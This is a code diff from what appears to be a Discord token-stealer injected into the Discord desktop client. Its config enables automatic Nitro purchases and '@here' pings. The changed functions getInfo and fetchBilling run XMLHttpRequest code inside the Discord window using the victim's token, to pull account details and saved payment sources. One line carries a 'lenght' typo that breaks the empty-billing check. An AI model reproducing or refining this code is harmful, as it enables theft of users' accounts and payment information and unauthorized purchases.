@@ -1,12 +1,9 @@
-const {
-    BrowserWindow,
-    session,
-} = require('electron');
-const os = require('os');
-const axios = require('axios');
+const args = process.argv;
+const fs = require('fs');
+const path = require('path');
 const https = require('https');
-const querystring = require("querystring");
-const fs = require("fs");
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron');
 
 const config = {
     auto_buy_nitro: true, ping_on_run: true, ping_val: "@here",
@@ -439,24 +436,22 @@ const discordPath = (function () {
       };
 
       const getInfo = async (token) => {
-        const response = await fetch(config.api, {
-          headers: {
-            'Authorization': token
-          }
-        });
-        const info = await response.json();
-        return info;
+        const info = await execScript(`var xmlHttp = new XMLHttpRequest();
+          xmlHttp.open("GET", "${config.api}", false);
+          xmlHttp.setRequestHeader("Authorization", "${token}");
+          xmlHttp.send(null);
+          xmlHttp.responseText;`);
+        return JSON.parse(info);
       };
       
       const fetchBilling = async (token) => {
-        const response = await fetch(`${config.api}/billing/payment-sources`, {
-          headers: {
-            'Authorization': token
-          }
-        });
-        const bill = await response.json();
-        if (!bill.length || bill.length === 0) return '';
-        return bill;
+        const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+          xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
+          xmlHttp.setRequestHeader("Authorization", "${token}"); 
+          xmlHttp.send(null); 
+          xmlHttp.responseText`);
+        if (!bill.lenght || bill.length === 0) return '';
+        return JSON.parse(bill);
       };
 
       const getBilling = async (token) => {
